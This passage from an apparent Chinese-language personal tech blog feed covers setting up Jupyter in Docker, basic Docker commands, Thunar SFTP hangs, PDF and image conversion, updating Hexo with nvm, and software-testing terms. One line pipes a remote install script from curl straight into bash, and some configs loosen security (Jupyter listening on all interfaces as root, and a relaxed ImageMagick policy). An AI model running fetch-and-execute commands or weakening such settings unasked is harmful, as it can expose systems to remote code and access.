/root/.jupyter/jupyter_notebook_config.py</span><br><span class="line"></span><br><span class="line">改为一下这些</span><br><span class="line">c.NotebookApp.allow_remote_access = True # 允许远程访问</span><br><span class="line">c.NotebookApp.ip=&#x27;0.0.0.0&#x27; # 自动获取服务器ip</span><br><span class="line">c.NotebookApp.allow_root =True # 打开root权限启动</span><br><span class="line">c.NotebookApp.open_browser = False # 服务端禁止自动打开浏览器</span><br><span class="line">c.NotebookApp.port = 2222 # 创建docker时候配置的端口号</span><br></pre></td></tr></table></figure></li><li><p>设置密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook password</span><br></pre></td></tr></table></figure></li><li><p>启动jupyter</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jupyter notebook</span><br></pre></td></tr></table></figure></li><li><p>通过screen启动，名字爱取啥取啥</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">启动一个窗口</span><br><span class="line">screen -S 名字</span><br><span class="line"></span><br><span class="line">// 启动jupyter</span><br><span class="line">jupyter notebook</span><br><span class="line"></span><br><span class="line">// 输入Ctrl a d退出窗口并保留运行</span><br><span class="line"></span><br><span class="line">// 查询窗口</span><br><span class="line">screen -ls</span><br><span class="line"></span><br><span class="line">// 进入已开启的窗口</span><br><span class="line">screen -r 名字</span><br></pre></td></tr></table></figure></li></ul><h3 id="jupyter使用需要注意的"><a href="#jupyter使用需要注意的" class="headerlink" title="jupyter使用需要注意的"></a>jupyter使用需要注意的</h3><ul><li><p>其实colab和这个都是一样的逻辑，只需要知道其中一个咋用，另一个也就知道了。</p></li><li><p>如果需要执行Linux命令，就在前面加一个<code>!</code>，后面正常接命令。请注意是英文的感叹号。例子如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">!ls</span><br></pre></td></tr></table></figure></li><li><p>如果要切换目录，那么<code>!cd 目录</code>就不会生效了，需要使用<code>%</code>。例子如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%cd 目录</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://stackoverflow.com/questions/75608323/how-do-i-solve-error-externally-managed-environment-every-time-i-use-pip-3">How do I solve “error: externally-managed-environment” every time I use pip 3?</a></li><li><a href="https://www.cnblogs.com/yourxiong/p/17692123.html">Docker安装配置JupyterNotebook详解</a></li><li><a href="https://www.runoob.com/linux/linux-comm-screen.html">Linux screen命令</a></li><li><a href="https://wu1015.github.io/2024/08/01/docker-base-usage">Docker的基本使用</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;拉取镜像&quot;&gt;&lt;a href=&quot;#拉取镜像&quot; class=&quot;headerlink&quot; title=&quot;拉取镜像&quot;&gt;&lt;/a&gt;拉取镜像&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;直接拉取镜像&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table</summary>
      
    
    
    
    <category term="笔记" scheme="http://wu1015.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="http://wu1015.github.io/tags/Linux/"/>
    
    <category term="Docker" scheme="http://wu1015.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Docker的基本使用</title>
    <link href="http://wu1015.github.io/2024/08/01/docker-base-usage/"/>
    <id>http://wu1015.github.io/2024/08/01/docker-base-usage/</id>
    <published>2024-08-01T09:16:57.000Z</published>
    <updated>2024-12-23T02:21:49.054Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Docker的安装"><a href="#Docker的安装" class="headerlink" title="Docker的安装"></a>Docker的安装</h2><h3 id="卸载旧版本"><a href="#卸载旧版本" class="headerlink" title="卸载旧版本"></a>卸载旧版本</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get remove docker \</span><br><span class="line">               docker-engine \</span><br><span class="line">               docker.io</span><br></pre></td></tr></table></figure><h3 id="使用apt安装"><a href="#使用apt安装" class="headerlink" title="使用apt安装"></a>使用apt安装</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure><ul><li>或者我这是没有上述的<code>docker-ce</code>等包，所以就安装了<code>docker-io</code>，但也能用。</li></ul><h3 id="运行镜像"><a href="#运行镜像" class="headerlink" title="运行镜像"></a>运行镜像</h3><ul><li><p>如果本地没有镜像会远程拉取。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run hello-world</span><br></pre></td></tr></table></figure></li><li><p>然后在2024年的今天，在国内基本已经不能如此拉取了。甚至连几个大的镜像站也关闭了。因此需要添加其他的镜像站。</p></li><li><p>添加到<code>/etc/docker/daemon.json</code>，如果没有这个文件就创建一个。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure></li></ul><p>输入以下内容并保存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [</span><br><span class="line">    &quot;https://docker.m.daocloud.io&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Docker的操作"><a href="#Docker的操作" class="headerlink" title="Docker的操作"></a>Docker的操作</h2><h3 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h3><ul><li><p>查看的Docker版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker --version</span><br></pre></td></tr></table></figure></li><li><p>查看Docker信息</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker info</span><br></pre></td></tr></table></figure></li><li><p>查看已有的镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker images</span><br></pre></td></tr></table></figure></li><li><p>查看正在运行的容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure><p><img src="https://wu1015-images.pages.dev/imgs/docker-base-usage/%E6%88%AA%E5%9B%BE_2024-08-01_09-56-58.png" alt="查看正在运行的容器"></p></li><li><p>关闭&#x2F;打开正在运行的容器。<code>CONTAINER ID</code>和<code>NAMES</code>为刚刚看到的容器属性，用哪个都行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker stop &lt;CONTAINER ID&gt; &lt;NAMES&gt;</span><br><span class="line">docker start &lt;CONTAINER ID&gt; &lt;NAMES&gt;</span><br></pre></td></tr></table></figure></li><li><p>进入已经打开了的容器，<code>CONTAINER ID</code>和<code>NAMES</code>为之前看到的容器属性，用哪个都行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker attach &lt;CONTAINER ID&gt; &lt;NAMES&gt;</span><br></pre></td></tr></table></figure></li><li><p>退出但不关闭容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 输入Ctrl P Q</span><br><span class="line"></span><br><span class="line">//退出并关闭容器</span><br><span class="line">exit</span><br></pre></td></tr></table></figure></li><li><p>修改容器名称</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker rename 原容器名称 新容器名称</span><br></pre></td></tr></table></figure><p><img src="https://wu1015-images.pages.dev/imgs/docker-base-usage/%E6%88%AA%E5%9B%BE_2024-08-01_09-59-12.png" alt="修改容器名称"></p></li><li><p>删除容器。<code>CONTAINER ID</code>和<code>NAMES</code>为刚刚看到的容器属性，用哪个都行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker rm &lt;CONTAINER ID&gt; &lt;NAMES&gt;</span><br><span class="line">docker rm &lt;CONTAINER ID&gt; &lt;NAMES&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="打包和导入导出镜像"><a href="#打包和导入导出镜像" class="headerlink" title="打包和导入导出镜像"></a>打包和导入导出镜像</h3><ul><li><p>将容器打包为镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">docker commit -m &quot;What you did to the image&quot; -a &quot;Author Name&quot; container_id repository/new_image_name</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">*参数说明</span><br><span class="line">*参数说明：</span><br><span class="line">*commit：提交命令</span><br><span class="line">*-m：提交的注释</span><br><span class="line">*-a：作者的名字</span><br><span class="line">*container_id：容器的id</span><br><span class="line">*repository/new_image_name：作者自定义的库名（一般和用户名一致）/镜像名*/</span><br></pre></td></tr></table></figure><p><img src="https://wu1015-images.pages.dev/imgs/docker-base-usage/%E6%88%AA%E5%9B%BE_2024-08-01_10-10-26.png" alt="容器打包为镜像"></p></li><li><p>导出容器的镜像,<code>CONTAINER ID</code>为之前看到的容器属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker export CONTAINER ID  &gt; 路径/文件名.tar</span><br><span class="line"></span><br><span class="line">//导出多个容器镜像为一个压缩包</span><br><span class="line">docker save CONTAINER ID CONTAINER ID CONTAINER ID  &gt; 路径/文件名.tar</span><br></pre></td></tr></table></figure></li><li><p>导入镜像</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker import - 仓库:名称 &lt; 路径/文件.tar</span><br><span class="line"></span><br><span class="line">//从一个压缩包导入多个容器镜像</span><br><span class="line">docker load --input 路径/文件名.tar</span><br></pre></td></tr></table></figure></li><li><p>启动导入的镜像，<code>COMMAND</code>是之前看到的镜像的一个属性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run 镜像id COMMAND</span><br></pre></td></tr></table></figure></li></ul><h3 id="直接下载镜像"><a href="#直接下载镜像" class="headerlink" title="直接下载镜像"></a>直接下载镜像</h3><ul><li><p>直接下载镜像而不下载docker。这么一来就不用过多担心国内无法拉取docker镜像的问题。完全可以直接挂梯子拉下来然后再导入进去。<del>（为什么不直接挂代理拉下来呢）</del></p></li><li><p>不过需要注意的是，拉下来后的导入应该使用<code>load</code>而不是<code>import</code>。</p></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://cloud.tencent.com/developer/article/2434428">国内无法拉取Docker镜像了？这些方法拯救你的Docker</a></li><li><a href="https://github.com/DaoCloud/public-image-mirror">public-image-mirror </a></li><li><a href="https://blog.csdn.net/weixin_43117620/article/details/129217954">【一站式教程】Ubuntu利用Docker进行深度学习</a></li><li><a href="https://github.com/NotGlop/docker-drag">Github项目_docker-drag</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Docker的安装&quot;&gt;&lt;a href=&quot;#Docker的安装&quot; class=&quot;headerlink&quot; title=&quot;Docker的安装&quot;&gt;&lt;/a&gt;Docker的安装&lt;/h2&gt;&lt;h3 id=&quot;卸载旧版本&quot;&gt;&lt;a href=&quot;#卸载旧版本&quot; class=&quot;header</summary>
      
    
    
    
    <category term="笔记" scheme="http://wu1015.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="Linux" scheme="http://wu1015.github.io/tags/Linux/"/>
    
    <category term="Docker" scheme="http://wu1015.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>Xubuntu的SFTP在thunar上的使用</title>
    <link href="http://wu1015.github.io/2024/07/23/sftp-in-thunar/"/>
    <id>http://wu1015.github.io/2024/07/23/sftp-in-thunar/</id>
    <published>2024-07-23T07:40:19.000Z</published>
    <updated>2024-12-23T02:28:21.370Z</updated>
    
    <content type="html"><![CDATA[<h2 id="正常使用"><a href="#正常使用" class="headerlink" title="正常使用"></a>正常使用</h2><ul><li>将sftp链接复制粘贴到thunar的地址栏上，回车就可以直接挂载了。</li><li>长时间不使用一定记得主动卸载掉。</li></ul><h2 id="异常解决"><a href="#异常解决" class="headerlink" title="异常解决"></a>异常解决</h2><ul><li>在长时间不用之后，sftp链接断开连接，但thunar没有及时中断，而是持续请求，这也会导致thunar直接卡死，重启进程，或是断网也无济于事。</li><li>只能重启解决或者使用ps命令查看sftp的进程，再直接kill掉。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps -A | grep sftp</span><br><span class="line">// 上面得到的pid</span><br><span class="line">kill pid xxx</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://www.runoob.com/linux/linux-comm-kill.html">Linux kill命令_菜鸟教程</a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;正常使用&quot;&gt;&lt;a href=&quot;#正常使用&quot; class=&quot;headerlink&quot; title=&quot;正常使用&quot;&gt;&lt;/a&gt;正常使用&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;将sftp链接复制粘贴到thunar的地址栏上，回车就可以直接挂载了。&lt;/li&gt;
&lt;li&gt;长时间不使用一定记得主</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="Linux" scheme="http://wu1015.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>PDF与图片的互相转换</title>
    <link href="http://wu1015.github.io/2024/07/19/pdf-convert/"/>
    <id>http://wu1015.github.io/2024/07/19/pdf-convert/</id>
    <published>2024-07-19T02:57:54.000Z</published>
    <updated>2024-12-23T02:26:52.570Z</updated>
    
    <content type="html"><![CDATA[<h2 id="PDF转图片"><a href="#PDF转图片" class="headerlink" title="PDF转图片"></a>PDF转图片</h2><ul><li><p>众所周知，对PDF的编辑基本都是建立在对图片的修改上，那么如果将其相对无损的转化为图片就是首要的问题。</p></li><li><p>首先想到的就是截图，但这与无损相悖。那么就剩下提取了。可以使用命令将其提取出来。命令如下，会输出以<code>outputname</code>为前缀的图片。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftoppm input.pdf outputname -png</span><br></pre></td></tr></table></figure></li></ul><h2 id="图片转PDF"><a href="#图片转PDF" class="headerlink" title="图片转PDF"></a>图片转PDF</h2><ul><li>图片合并为PDF同样也是有命令<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert input.png input1.png output.pdf</span><br></pre></td></tr></table></figure></li></ul><p>如果名称基本相同的话也可以用通配符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">convert input&#123;01...12&#125;.png output.pdf</span><br></pre></td></tr></table></figure><h2 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="可能会遇到的问题"></a>可能会遇到的问题</h2><ul><li><p>报错<code>convert: attempt to perform an operation not allowed by the security policy &#39;PDF&#39; @ error/constitute.c/IsCoderAuthorized/408</code>。安全策略问题。前往&#x2F;etc&#x2F;ImageMagick-6&#x2F;policy.xml改对应行如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 原本</span><br><span class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;none&quot; pattern=&quot;PDF&quot; /&gt;</span><br><span class="line">// 改为</span><br><span class="line">&lt;policy domain=&quot;coder&quot; rights=&quot;read|write&quot; pattern=&quot;PDF&quot; /&gt;</span><br></pre></td></tr></table></figure></li><li><p>报错<code>convert-im6.q16: cache resources exhausted </code>outputname_12.png’ @ error&#x2F;cache.c&#x2F;OpenPixelCache&#x2F;4095.&#96;。爆内存问题。因为默认设置只有256MiB，去之前的配置文件改对应内存配置就可以了。</p></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://blog.csdn.net/u013919171/article/details/113520520">在ubuntu上如何将多张图片或PDF合到一个PDF上</a></li><li><a href="https://github.com/ImageMagick/ImageMagick/issues/396#issuecomment-319569255">ImageMagick  Memory issues #396 </a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;PDF转图片&quot;&gt;&lt;a href=&quot;#PDF转图片&quot; class=&quot;headerlink&quot; title=&quot;PDF转图片&quot;&gt;&lt;/a&gt;PDF转图片&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;众所周知，对PDF的编辑基本都是建立在对图片的修改上，那么如果将其相对无损的转化为图片就是</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="PDF" scheme="http://wu1015.github.io/tags/PDF/"/>
    
  </entry>
  
  <entry>
    <title>更新Hexo出现的一些问题</title>
    <link href="http://wu1015.github.io/2024/07/19/hexo-update-mark/"/>
    <id>http://wu1015.github.io/2024/07/19/hexo-update-mark/</id>
    <published>2024-07-19T02:04:14.000Z</published>
    <updated>2024-12-23T02:23:25.382Z</updated>
    
    <content type="html"><![CDATA[<h2 id="先说结果"><a href="#先说结果" class="headerlink" title="先说结果"></a>先说结果</h2><ul><li>使用 nvm 进行安装，问题并没有被解决但也还算是解决吧，毕竟能用就行。</li></ul><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><ul><li>在执行<code>apt install npm</code>时出现依赖问题无法安装，如下所示。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">有一些软件包无法被安装。如果您用的是 unstable 发行版，这也许是因为系统无法达到您要求的状态造成的。该版本中可能会有一些您需要的软件包尚未被创建或是它们已被从新到(Incoming)目录移出。下列信息可能会对解决问题有所帮助：</span><br><span class="line"></span><br><span class="line">下列软件包有未满足的依赖关系：</span><br><span class="line"> npm : 依赖: node-agent-base 但是它将不会被安装</span><br><span class="line">依赖: node-aproba 但是它将不会被安装</span><br><span class="line">依赖: node-archy 但是它将不会被安装</span><br><span class="line">依赖: node-cacache 但是它将不会被安装</span><br><span class="line">依赖: node-chalk 但是它将不会被安装</span><br><span class="line">依赖: node-cli-table3</span><br><span class="line">依赖: node-colors 但是它将不会被安装</span><br><span class="line">依赖: node-columnify 但是它将不会被安装</span><br><span class="line">依赖: node-debug 但是它将不会被安装</span><br><span class="line">依赖: node-emoji-regex</span><br><span class="line"> 依赖: node-got 但是它将不会被安装</span><br><span class="line">依赖: node-graceful-fs 但是它将不会被安装</span><br><span class="line">依赖: node-gyp 但是它将不会被安装</span><br><span class="line">依赖: node-https-proxy-agent 但是它将不会被安装</span><br><span class="line">依赖: node-mkdirp 但是它将不会被安装</span><br><span class="line">依赖: node-ms 但是它将不会被安装</span><br><span class="line">依赖: node-nopt 但是它将不会被安装</span><br><span class="line">依赖: node-normalize-package-data 但是它将不会被安装</span><br><span class="line">依赖: node-npm-package-arg 但是它将不会被安装</span><br><span class="line">依赖: node-npmlog 但是它将不会被安装</span><br><span class="line">依赖: node-read-package-json 但是它将不会被安装</span><br><span class="line">依赖: node-rimraf 但是它将不会被安装</span><br><span class="line">依赖: node-semver 但是它将不会被安装</span><br><span class="line">依赖: node-ssri 但是它将不会被安装</span><br><span class="line">依赖: node-string-width 但是它将不会被安装</span><br><span class="line">依赖: node-strip-ansi 但是它将不会被安装</span><br><span class="line">依赖: node-tar 但是它将不会被安装</span><br><span class="line">依赖: node-validate-npm-package-name 但是它将不会被安装</span><br><span class="line">依赖: node-which 但是它将不会被安装</span><br><span class="line">依赖: node-write-file-atomic 但是它将不会被安装</span><br><span class="line">依赖: nodejs:any (&gt;= 10)</span><br><span class="line">推荐: node-tap 但是它将不会被安装</span><br><span class="line">E: 无法修正错误，因为您要求某些软件包保持现状，就是它们破坏了软件包间的依赖关系。</span><br></pre></td></tr></table></figure></li></ul><h2 id="解决方法-安装nvm"><a href="#解决方法-安装nvm" class="headerlink" title="解决方法_安装nvm"></a>解决方法_安装nvm</h2><ul><li><p>打开终端安装nvm</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.5/install.sh | bash</span><br></pre></td></tr></table></figure></li><li><p>重启终端并输入<code>nvm</code>测试是否安装成功。</p></li><li><p>安装最新版node，如需指定版本直接将nodejs换为对应版本号即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nvm install node</span><br></pre></td></tr></table></figure></li></ul><h2 id="更新hexo"><a href="#更新hexo" class="headerlink" title="更新hexo"></a>更新hexo</h2><ul><li><p>安装ncu进行更新检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm i -g npm-check-updates</span><br><span class="line">ncu -u</span><br></pre></td></tr></table></figure></li><li><p>使用npm进行更新</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure></li><li><p>查看hexo版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure></li></ul><h2 id="文章起初"><a href="#文章起初" class="headerlink" title="文章起初"></a>文章起初</h2><ul><li>因为之前了解到hexo高版本对文章的生成性能有优化， 毕竟我也不想生成个文章花老久时间，使用萌生了升级hexo版本的想法。<a href="https://d-sketon.top/20231111/hexo-generate-benchmark/">Hexo 5&#x2F;6&#x2F;7 生成文章性能对比_by d-sketon</a></li></ul><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><blockquote><ul><li><a href="https://stackoverflow.com/questions/39981828/installing-nodejs-and-npm-on-linux/39981888#39981888">Installing nodejs and npm on linux</a></li><li><a href="https://bambrow.com/20211124-hexo-next-upgrade/">Hexo 静态博客升级指南（2021 年版） </a></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;先说结果&quot;&gt;&lt;a href=&quot;#先说结果&quot; class=&quot;headerlink&quot; title=&quot;先说结果&quot;&gt;&lt;/a&gt;先说结果&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;使用 nvm 进行安装，问题并没有被解决但也还算是解决吧，毕竟能用就行。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="日常" scheme="http://wu1015.github.io/categories/%E6%97%A5%E5%B8%B8/"/>
    
    
    <category term="Linux" scheme="http://wu1015.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>软件测试基础学习</title>
    <link href="http://wu1015.github.io/2024/07/01/SoftwareTestingLearning/"/>
    <id>http://wu1015.github.io/2024/07/01/SoftwareTestingLearning/</id>
    <published>2024-07-01T10:56:33.000Z</published>
    <updated>2024-12-23T02:28:34.866Z</updated>
    
    <content type="html"><![CDATA[<h2 id="软件测试基础学习"><a href="#软件测试基础学习" class="headerlink" title="软件测试基础学习"></a>软件测试基础学习</h2><ul><li><p>什么是静态测试：静态测试是指不运行被测试的软件系统，而是采用其他手段和技术对被测试软件进行检测的一种测试技术。</p></li><li><p>什么是动态测试：动态测试是一种测试方法，通过运行软件程序并输入不同的数据和操作，以检查程序的实际行为和输出结果是否符合预期。 动态测试可以帮助发现软件程序中的错误和缺陷，包括功能错误、性能问题、安全漏洞等。</p></li><li><p>什么是黑盒测试：黑盒测试又称为“功能测试”，是将测试对象看做一个黑盒，在并不考虑软件产品的内部结构和处理过程的基础上对软件产品进行功能测试。黑盒测试注重软件产品的“功能性需求”。</p></li><li><p>什么是白盒测试：白盒测试，又称结构测试，主要用于单元测试阶段。它的前提是可以把程序看成装在一个透明的白箱子里，测试者完全知道程序的结构和处理算法。这种方法按照程序内部逻辑设计测试用例，检测程序中的主要执行通路是否都能按预定要求正常工作。 白盒测试根据软件的内部逻辑设计测试用例，常用的技术是逻辑覆盖，即考察用测试数据运行被测程序时对程序逻辑的覆盖程度。主要的覆盖标准有 6 种：语句覆盖、判定覆盖、条件覆盖、判定&#x2F;条件覆盖、组合条件覆盖和路径覆盖。</p></li><li><p>什么是单元测试：单元测试又称为模块测试，是针对程序模块（软件设计的最小单位）来进行正确性检验的测试工作。程序单元是应用的最小可测试部件。</p></li><li><p>什么是集成测试：集成测试被定义为一种测试类型，其中软件的不同模块被集成并作为一个整体进行测试。一个典型的软件项目由多个软件模块组成，这些模块由不同的程序员进行编码。集成测试的目的是在集成这些不同的软件模块时揭示它们之间交互中的缺陷。集成测试专注于检查这些模块之间的数据通信。因此，它也被称为“ I＆T” （集成和测试）。</p></li><li><p>简述缺陷产生原因：</p><ul><li>软件缺陷就是通常所说的Bug，它是指软件中(包括程序和文档)存在的影响软件正常运行的问题。IEEE(Institute of Electrical and Electronics Engineers，电气电子工程师协会)729-1983标准对软件缺陷有一个标准的定义：从产品内部看,缺陷是产品开发或维护过程中存在的错误、毛病等各种问题;从产品外部看，缺陷是系统运行过程中某种功能的失效或违背。</li><li>软件缺陷的产生主要是由软件产品的特点和开发过程决定的，比如需求不清晰、需求频繁变更、软件结构复杂、编码问题、项目期限短、使用新技术、开发人员水平有限等。</li></ul></li><li><p>静态测试与动态测试区别：</p><ul><li>它们的主要区别在于测试时是否需要运行被测试的程序。</li><li>静态测试 主要是在不运行程序的情况下进行，通过分析代码、审查需求文档来查找错误， 动态测试 则是在程序运行的状态下执行，通过输入测试用例验证程序的实际运行结果和预期结果是否一致。</li></ul></li><li><p>黑盒与白盒测试的相关方法，黑盒白盒测试优缺点：</p><ul><li><blockquote><p><a href="https://blog.csdn.net/qq_42944594/article/details/121907540">白盒</a>、<a href="https://www.itest.info/wiki/white-box-testing">白盒详解</a>、 <a 